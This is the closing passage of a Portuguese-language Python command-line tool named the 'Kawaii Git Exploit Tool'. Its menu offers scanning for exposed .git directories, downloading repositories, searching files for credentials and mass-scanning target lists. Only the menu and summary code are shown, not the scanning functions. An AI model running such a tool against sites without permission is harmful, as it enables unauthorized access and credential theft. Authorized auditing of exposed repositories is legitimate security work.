            print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Resumo do Scanner *:･ﾟ✧*:･ﾟ✧{Colors.END}")
            for item in found_items:
                if "403" in item:
                    print(f"{Colors.YELLOW}• {item}{Colors.END}")
                else:
                    print(f"{Colors.RED}• {item}{Colors.END}")
        else:
            print(f"\n{Colors.YELLOW}(´• ω •`) Scanner concluído - nenhum item sensível encontrado{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}(╥﹏╥) Erro no scanner: {str(e)}{Colors.END}")

def main():
    try:
        print_banner()
        
        while True:
            try:
                print_menu()
                choice = input(f"\n{Colors.PINK}🌸 Escolha uma opção: {Colors.END}")
                
                if choice == "1":
                    url = input(f"\n{Colors.CYAN}🌸 Digite a URL do site (ex: https://exemplo.com): {Colors.END}")
                    if url:
                        is_exposed, found_files = check_git_exposed(url)
                        
                        if is_exposed and input(f"\n{Colors.CYAN}🌸 Deseja explorar os arquivos encontrados? (s/n): {Colors.END}").lower() == 's':
                            explore_git(url.rstrip('/') + '/.git/', found_files)
                
                elif choice == "2":
                    url = input(f"\n{Colors.CYAN}🌸 Digite a URL do .git (ex: https://exemplo.com/.git/): {Colors.END}")
                    if url:
                        explore_git(url, [])
                
                elif choice == "3":
                    url = input(f"\n{Colors.CYAN}🌸 Digite a URL do .git (ex: https://exemplo.com/.git/): {Colors.END}")
                    if url:
                        download_git_repo(url)
                
                elif choice == "4":
                    url = input(f"\n{Colors.CYAN}🌸 Digite a URL do arquivo (ex: https://exemplo.com/.git/config): {Colors.END}")
                    if url:
                        search_credentials_in_file(url)
                
                elif choice == "5":
                    targets_input = input(f"\n{Colors.CYAN}🌸 Digite os alvos (um por linha) ou deixe em branco para carregar de arquivo: {Colors.END}")
                    
                    if targets_input.strip():
                        targets = targets_input.split('\n')
                    else:
                        file_path = input(f"{Colors.CYAN}🌸 Digite o caminho do arquivo com os alvos: {Colors.END}")
                        try:
                            with open(file_path, 'r') as f:
                                targets = f.read().splitlines()
                            print(f"{Colors.GREEN}🌸 Alvos carregados: {len(targets)}{Colors.END}")
                        except Exception as e:
                            print(f"{Colors.RED}(╥﹏╥) Erro ao carregar arquivo: {str(e)}{Colors.END}")
                            continue
                    
                    if targets:
                        mass_scan(targets)
                
                elif choice == "6":
                    url = input(f"\n{Colors.CYAN}🌸 Digite a URL para escanear (ex: https://exemplo.com): {Colors.END}")
                    if url:
                        advanced_directory_scanner(url)
                
                elif choice == "7":
                    create_site()
                
                elif choice == "8":
                    start_local_server()
                
                elif choice == "0":
                    print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Obrigado por usar o Kawaii Git Exploit Tool! *:･ﾟ✧*:･ﾟ✧{Colors.END}")
                    print(f"{Colors.CYAN}Desenvolvido com ❤️ pela Rede Valkiria - Anti CP & Fraudes{Colors.END}")
                    break
                
                else:
                    print(f"\n{Colors.RED}(╥﹏╥) Opção inválida! Por favor, escolha uma opção válida.{Colors.END}")
                
                press_enter_to_continue()
            
            except KeyboardInterrupt:
                print(f"\n{Colors.PINK}\n(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧ Operação cancelada pelo usuário ✧･ﾟ: *✧･ﾟ:*{Colors.END}")
                press_enter_to_continue()
            
            except Exception as e:
                print(f"\n{Colors.RED}(╥﹏╥) Ocorreu um erro: {str(e)}{Colors.END}")
                press_enter_to_continue()
    
    except KeyboardInterrupt:
        print(f"\n{Colors.PINK}\n(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧ Programa encerrado pelo usuário ✧･ﾟ: *✧･ﾟ:*{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}(╥﹏╥) Ocorreu um erro inesperado: {str(e)}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()
